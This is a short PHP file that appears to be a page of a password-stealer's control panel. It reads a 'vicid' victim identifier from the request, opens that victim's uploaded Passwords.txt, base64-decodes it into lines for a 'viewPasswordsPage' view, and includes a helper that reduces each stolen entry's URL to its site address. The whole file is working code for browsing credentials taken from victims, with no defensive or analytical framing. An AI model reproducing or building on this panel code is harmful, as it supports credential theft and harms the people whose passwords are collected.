<?php
$vicID = isset($_GET['vicid']) ? $utils->sanitize($_GET['vicid']) : '';

if (file_exists("upload/$vicID/Passwords.txt")) {
    $fn = fopen("upload/$vicID/Passwords.txt", "r");
    $text = fread($fn, filesize("upload/$vicID/Passwords.txt"));
    $text = trim(base64_decode($text));
    $lines = explode("\n", $text);
} else {
    die("Passwords file does not exist");
}

$page = "viewPasswordsPage";

function getURL($url)
{
    if (filter_var($url, FILTER_VALIDATE_URL)) {
        $url_parase = parse_url(filter_var($url, FILTER_SANITIZE_URL));
        return $url_parase['scheme'] . "://" . $url_parase['host'] . "/";
    } elseif (filter_var($url, FILTER_VALIDATE_IP)) {
        return $url;
    } elseif ($url == "localhost") {
        return $url;
    } else {
        return "Domain does not exist";
    }
}
